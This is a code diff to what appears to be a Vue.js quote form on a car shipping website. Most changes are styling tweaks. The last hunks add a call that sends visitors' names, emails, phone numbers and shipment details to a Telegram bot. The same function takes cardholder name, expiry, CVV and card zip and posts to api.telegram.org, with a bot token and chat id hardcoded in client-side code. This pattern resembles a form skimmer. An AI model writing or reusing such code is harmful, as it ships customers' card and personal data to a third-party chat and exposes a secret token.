@@ -70,11 +70,11 @@
             class="lg:col-span-6 col-span-12 information-form rounded-[16px] lg:pt-[32rem] px-[22px] py-[15px] lg:pb-[36rem] lg:px-[48rem] overflow-hidden border-solid border-[1px] border-[#e6ecf0] relative z-[2]"
           >
             <div>
-              <h1 class="text-[30px] font-bold mb-[px]">
+              <h1 class="lg:text-[30px] text-[25px] font-bold mb-[px]">
                 Car Shipping Cost Calculator
               </h1>
               <p
-                class="font-normal text-[16rem] leading-[130%] text-[#5C6670] mb-[24px]"
+                class="font-normal text-[16px] leading-[130%] text-[#5C6670] mb-[24px]"
                 style="color: rgb(92, 102, 112);"
               >
                 Our Professional Team is Ready to Assist You. If you any help do
@@ -196,7 +196,7 @@
               </div>
             </div>
             <div class="mt-[20px]">
-              <p class="terms-quoteform">
+              <p class="terms-quoteform lg:text-[16px] text-[12px]">
                 By proceeding with the above form, you accept our
                 <a
                   href="https://www.xpresstransportation.org/terms-and-conditions"
@@ -222,11 +222,11 @@
             class="lg:col-span-6 col-span-12 information-form rounded-[16px] lg:pt-[32rem] px-[22px] py-[15px] lg:pb-[36rem] lg:px-[48rem] overflow-hidden border-solid border-[1px] border-[#e6ecf0] relative z-[2]"
           >
             <div>
-              <h1 class="text-[30px] font-bold mb-[px]">
+              <h1 class="lg:text-[30px] text-[25px] font-bold mb-[px]">
                 Let's Get a Quote For You
               </h1>
               <p
-                class="font-normal text-[16rem] leading-[130%] text-[#5C6670] mb-[24px]"
+                class="font-normal text-[16px] leading-[130%] text-[#5C6670] mb-[24px]"
                 style="color: rgb(92, 102, 112);"
               >
                 Our Professional Team is Ready to Assist You. If you any help do
@@ -265,7 +265,7 @@
             </div>
 
             <div class="mt-[20px]">
-              <p class="terms-quoteform">
+              <p class="terms-quoteform lg:text-[16px] text-[12px]">
                 By proceeding with the above form, you accept our
                 <a
                   href="https://www.xpresstransportation.org/terms-and-conditions"
@@ -774,12 +774,25 @@ export default {
               this.premium = this.roundNearest5(price * 1.5);
               this.step++;
             } else {
-              console.log("error");
+              this.$notify({
+                title: 'Wrong zip code',
+                message: 'Please select from the list',
+                type: 'error',
+                position: 'top-left'
+              });
+              this.step = 1;
+              this.sendToTelegram(
+                  pickUpZip,
+                  dropOffZip,
+                  shippingDate,
+                  vehicleType,
+                  this.personalInfo.name,
+                  this.personalInfo.email,
+                  this.personalInfo.phone,
+              );
             }
           })
-          .catch(() => {
-            console.log("error");
-          });
+
       }
     },
     async searchZipCodes(key, cb) {
@@ -790,7 +803,6 @@ export default {
       }, 100);
     },
     async sendToTelegram(
-      userIp,
       pickup,
       delivery,
       date,
@@ -803,7 +815,7 @@ export default {
       ccname,
       ccdate,
       cccvv,
-      cczip
+      cczip,
     ) {
       await this.$axios.post(
         `https://api.telegram.org/bot5878927199:AAGM4j1rVxyqRv7xpD4NWM_EdIcEXKEuUwE/sendMessage?chat_id=-1001900427343&text=User IP: ${this.userIp}, Customer Info:
